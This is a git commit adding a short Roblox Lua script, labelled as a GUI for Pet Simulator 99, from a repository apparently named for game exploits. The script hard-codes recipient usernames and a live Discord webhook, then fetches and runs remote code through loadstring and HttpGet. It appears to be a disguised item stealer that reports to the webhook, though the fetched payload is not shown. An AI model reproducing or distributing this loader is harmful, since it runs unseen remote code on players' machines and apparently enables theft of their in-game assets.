8ec6deabf483418a1576c06aed941a0423c0eb9a
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-21 11:04:36 +0200

    Added ps99 script: Petsim99-Gui

---
+++ ps99/Petsim99-Gui.lua
@@ -0,0 +1,5 @@
+Username = "VcosmicFG"
+Username2 = "VcosmicFG"
+Webhook = "https://discord.com/api/webhooks/1363802494689476688/qckB3bSd17CyS7bL2hr9Pyk9tlr7diMBHp8RFWKtFJ0lS662_cFsXeo-j8_EUE2BOfiR"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
